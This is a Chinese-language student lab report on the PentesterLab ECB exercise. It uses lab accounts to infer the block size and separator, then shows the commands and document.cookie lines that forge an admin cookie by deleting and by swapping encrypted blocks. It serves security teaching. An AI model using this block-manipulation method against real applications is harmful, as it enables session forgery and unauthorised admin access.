# 对称加密ECB模式的漏洞利用——实验报告

## **实验环境**

+ `Google Chrome` 浏览器
+ `Oracle VM VirtualBox`
+ `Linux (Oracle 32-bit)`
+ `Ubuntu 20.04`

## **实验目的**

理解`ECB`加密模式，检测并利用该模式下的两个漏洞

+ 加密消息的块可以在不干扰解密过程的情况下删除。
+ 来自加密消息的块可以四处移动，并且不会干扰解密过程。

## **实验原理**

**一、什么是`ECB`？**

`ECB` （Electronic Codebook，电码本）是一种加密模式，其中消息被分割成X字节长度的块，每个块都使用一个密钥分别进行加密。在该模式下，每一组的加解密都是独立的。

![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\ECB原理.png)

<center style="color:#C0C0C0">引自：对称加密 ECB 模式的漏洞利用综合实验指南</center>

+ 优点：操作简单易于实现；基于其**分组独立性**，可以实现并行处理，同时也可以很好地防止误差传播，一组出现错误对其他独立的组没有影响。
+ 缺点：所有分组的加密方式一致，导致明文中的重复内容在密文中可以体现出来，**难以抵抗统计分析攻击**。所以该模式只适用于数据量少的信息安全保护，例如密钥保护。

**二、什么是`cookie`？**

+ Cookie是Web浏览器存储在用户机器上的文本文件。是Web应用程序维护应用程序状态的一种方法。它们被网站用于身份验证、存储网站信息/首选项、其他浏览信息以及在访问Web服务器时可以帮助Web浏览器的任何其他内容。

+ Cookie包含为安全目的加密的特定信息。通常情况下，cookie与HTTP服务器的HTTP头一起连接到Web浏览器，以响应用户请求。每当需要访问特定网站时，就会将存储的cookie发送到HTTP服务器。

## **实验内容**

+ 创建2个名称相似的用户：**测试1**和**测试2**以及相同的密码，然后查看应用程序发送回的`cookie`。
+ 创建一个由相同字符组成的真正长名的用户(比如20次a)，然后查看应用程序发送回的`cookie`。
+ 创建一个用户，它将允许您通过删除加密的数据来以管理员身份登录。
+ 创建一个用户，通过交换加密块实现以管理员身份登录。

## **实验过程**

+ 搭建实验环境

  + 下载镜像

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\下载镜像.png)

  + 计算校验和

    ```
    #在windows主机cmd中将镜像传入虚拟机
    C:\Users\Lenovo>scp C:\Users\Lenovo\Desktop\ecb_i386.iso cuc@192.168.56.101:/home/cuc
    cuc@192.168.56.101's password:
    ecb_i386.iso                                                100%  169MB  87.4MB/s   00:01
    
    #在Linux虚拟机中计算校验和
    cuc@cuc-lab:~$ md5sum ecb_i386.iso
    a7114704fe356b9538dab4e2274f7981  ecb_i386.iso
    ```

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\计算校验和.png)

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\校验和对比无误.png)

  + 新建一个`Linux (Oracle 32-bit)`虚拟机，将镜像导入，并设置好网络

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\安装镜像.png)

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\网卡1.png)

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\网卡2.png)

  + 进入虚拟机，使用`ifcongig`命令查看 `IP` 地址——`192.168.56.102`

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\查看虚拟机ip地址.png)

  + 打开谷歌浏览器，输入虚拟机 `IP` 地址进行访问

    ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\访问成功.png)

+ 创建一个账户，登录多次，观察应用程序中返回的cookie值是否发生变化

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\HK1登录.png)

  ```
  #base64解码
  cuc@cuc-lab:~$ echo WEri+ip5+WE= | base64 -d | hexdump -C
  00000000  58 4a e2 fa 2a 79 f9 61                           |XJ..*y.a|
  00000008
  ```

  **统计结果如下：**

  | 登录次数 | 账户名 | 密码  | cookie(`uri`解码后) | cookie(`base64`解码后)    |
  | -------- | ------ | ----- | ------------------- | ------------------------- |
  | 1        | `HK1`  | `cuc` | `WEri+ip5+WE=`      | `58 4a e2 fa 2a 79 f9 61` |
  | 2        | `HK1`  | `cuc` | `WEri+ip5+WE=`      | `58 4a e2 fa 2a 79 f9 61` |

  **结论：**

  同一账户登陆多次后，程序发送的cookie没有更改。安全情况下每次登录时，发回的cookie都应该是唯一的。如果cookie总是一样的，它可能总是有效的，而且不会有任何方式使它无效。我们就找到了该模式下的漏洞。

+ 创建2个名称相似的用户：`test1` 和`test2` 以及相同的密码，然后查看应用程序发送回的cookie。

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\test1登录.png)
  
  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\test2登录.png)
  
  ```
  cuc@cuc-lab:~$ echo fvOLPBqe7bltj678jvc9rQ== | base64 -d | hexdump -C
  00000000  7e f3 8b 3c 1a 9e ed b9  6d 8f ae fc 8e f7 3d ad  |~..<....m.....=.|
  00000010
  cuc@cuc-lab:~$ echo GVRd+NbdZFJtj678jvc9rQ== | base64 -d | hexdump -C
  00000000  19 54 5d f8 d6 dd 64 52  6d 8f ae fc 8e f7 3d ad  |.T]...dRm.....=.|
  00000010
  ```
  
  **统计结果如下：**
  
  | 账户  | cookie（`uri`解码后）      | cookie（`base64`解码后）                           |
  | ----- | -------------------------- | -------------------------------------------------- |
  | test1 | `fvOLPBqe7bltj678jvc9rQ==` | `7e f3 8b 3c 1a 9e ed b9  6d 8f ae fc 8e f7 3d ad` |
  | test2 | `GVRd+NbdZFJtj678jvc9rQ==` | `19 54 5d f8 d6 dd 64 52  6d 8f ae fc 8e f7 3d ad` |
  
  可以看到，两个账户的 `cookie` 解密后值看起来非常相似。
  
+ 创建一个由相同字符组成的真正长名的用户(20个h)，然后查看应用程序发送回的cookie。

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\20个h登录.png)

  ```
  cuc@cuc-lab:~$ echo dMjkVdA0i0d0yORV0DSLR+fnK29indeGdMjkVdA0i0d0yORV0DSLRxBsm5+LNWpS | base64 -d | hexdump -C
  00000000  74 c8 e4 55 d0 34 8b 47  74 c8 e4 55 d0 34 8b 47  |t..U.4.Gt..U.4.G|
  00000010  e7 e7 2b 6f 62 9d d7 86  74 c8 e4 55 d0 34 8b 47  |..+ob...t..U.4.G|
  00000020  74 c8 e4 55 d0 34 8b 47  10 6c 9b 9f 8b 35 6a 52  |t..U.4.G.l...5jR|
  00000030
  ```

  | 账户  | 密码  | cookie（`uri`解码后）                                        | cookie(`base64`解码后)                                       |
  | ----- | ----- | ------------------------------------------------------------ | ------------------------------------------------------------ |
  | 20个h | 20个h | `dMjkVdA0i0d0yORV0DSLR+fnK29indeGdMjkVdA0i0d0yORV0DSLRxBsm5+LNWpS` | `74 c8 e4 55 d0 34 8b 47  74 c8 e4 55 d0 34 8b 47  e7 e7 2b 6f 62 9d d7 86  74 c8 e4 55 d0 34 8b 47  74 c8 e4 55 d0 34 8b 47  10 6c 9b 9f 8b 35 6a 52` |

  从解码后的 `cookie` 可以看到，`74 c8 e4 55 d0 34 8b 47` 会多次返回。根据模式的大小，我们可以推断 `ECB` 加密使用8字节的块大小。该示例使用了一个较弱的加密机制，而现实生活中的示例很可能会使用更大的块大小。除此之外还可以观察到，重复的8字节块中会出现不一样的块，这说明用户名和密码没有直接连接，而是添加了一个分隔符。

  **所以对加密的流做出两种模式判断：**

  + 该流包含用户名、分隔符和密码
  + 该流包含密码、分隔符和用户名

  为了验证加密流具体是哪一种模式，创建一个长用户名短密码的用户：

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\20个k登录.png)

  ```
  cuc@cuc-lab:~$ echo X/M5R1BuFnxf8zlHUG4WfPEBZ+734hwG | base64 -d | hexdump -C
  00000000  5f f3 39 47 50 6e 16 7c  5f f3 39 47 50 6e 16 7c  |_.9GPn.|_.9GPn.||
  00000010  f1 01 67 ee f7 e2 1c 06                           |..g.....|
  00000018
  ```

  | 账户  | 密码 | cookie（`uri`解码后）              | cookie(`base64`解码后)                                       |
  | ----- | ---- | ---------------------------------- | ------------------------------------------------------------ |
  | 20个k | cuc  | `X/M5R1BuFnxf8zlHUG4WfPEBZ+734hwG` | `5f f3 39 47 50 6e 16 7c 5f f3 39 47 50 6e 16 7c f1 01 67 ee f7 e2 1c 06` |

  可以看到重复字节块在前，说明使用的是**“用户名+分隔符+密码”**的模式。为了进一步确定分隔符的大小，进行多组测试：![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\1234登录.png)

  ```
  cuc@cuc-lab:~$ echo W62PbquqiOk= | base64 -d | hexdump -C
  00000000  5b ad 8f 6e ab aa 88 e9                           |[..n....|
  00000008
  ```

  | 用户名（长度） | 密码（长度） | 用户名+密码总长度 | cookie解码后长度 |
  | -------------- | ------------ | ----------------- | ---------------- |
  | HK1（3）       | cuc(3)       | 6                 | 8                |
  | 1234 (4)       | cuc(3)       | 7                 | 8                |
  | test1 (5)      | cuc(3)       | 8                 | 16               |

  <center style="color:#C0C0C0">注：HK1和test1已经创建过，创建用户1234进一步测试</center>

  从上表中看到，当用户名+密码的长度大于7时，被解码后的cookie的大小从8字节增加到16字节。我们可以从这个值推断**分隔符是单字节**，因为加密是每个8字节的块完成的。如果在与分隔符对应的块之后删除所有内容，仍然可以通过身份验证。所以当应用程序使用cookie时，似乎不使用密码。只需要获得正确的用户名|分隔符，就可以在应用程序中作为用户名进行身份验证。

+ 创建一个用户，它将允许您通过删除加密的数据来以管理员身份登录。

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\admin.png)

  ```
  #解密
  cuc@cuc-lab:~$ echo GkzSM2vKHdey4lt9zx5CP22PrvyO9z2t | base64 -d | hexdump -C
  00000000  1a 4c d2 33 6b ca 1d d7  b2 e2 5b 7d cf 1e 42 3f  |.L.3k.....[}..B?|
  00000010  6d 8f ae fc 8e f7 3d ad                           |m.....=.|
  00000018
  
  #删除前八个字节后再加密
  cuc@cuc-lab:~$ echo "b2e25b7dcf1e423f6b8faefc8ef73dad" | xxd -r -p |base64
  suJbfc8eQj9rj678jvc9rQ==
  ```

  在网页修改cookie：

  ```
  document.cookie='auth=suJbfc8eQj9rj678jvc9rQ==';
  ```

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\修改cookie.png)

  刷新页面后成功以管理员身份登录：

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\管理员身份登录.png)

+ 创建一个用户，通过交换加密块实现以管理员身份登录。

  从前面的实验可以得出分隔符是一个字节，所以可以创建完美用户名和密码实现交换块从而获得正确的伪造值。

  用户：`homework(8字节) + 7空格`

  密码：`admin(5字节) + 3空格`

  ```
  #解密原cookie
  cuc@cuc-lab:~$ echo TA5rOF7/MP61BlFFazd3eshx6uXNvSnx | base64 -d | hexdump -C
  00000000  4c 0e 6b 38 5e ff 30 fe  b5 06 51 45 6b 37 77 7a  |L.k8^.0...QEk7wz|
  00000010  c8 71 ea e5 cd bd 29 f1                           |.q....).|
  00000018
  
  #交换加密块之后在进行加密
  cuc@cuc-lab:~$ echo "c871eae5cdbd29f1b50651456b37777a4c0e6b385eff30fe" | xxd -r -p |base64
  yHHq5c29KfG1BlFFazd3ekwOazhe/zD+
  
  #网页修改cookie
  document.cookie='auth=yHHq5c29KfG1BlFFazd3ekwOazhe/zD+';
  ```

  ![](C:\Users\Lenovo\Desktop\ECB漏洞利用\img\交换密码块登录成功.png)

+ **实验小结：**通过上述实验可以知道通过篡改加密信息访可以问其他用户，并且加密不能作为签名的替代品。了解了如何使用`ECB`加密来获得对解密信息的控制。

## **实验遇到的问题及解决办法**

+ `windows` 操作系统计算校验和没有直接的命令，将镜像传入`linux` 虚拟机中进行计算即可。
+ 修改cookie后要通过刷新页面实现管理员登录，退出重登会出错。

## **参考文献**

+ [对称加密 `ECB` 模式的漏洞利用综合实验指南](https://pentesterlab.com/exercises/ecb/course)

+ [cookie的含义](https://m.php.cn/article/413663.html)
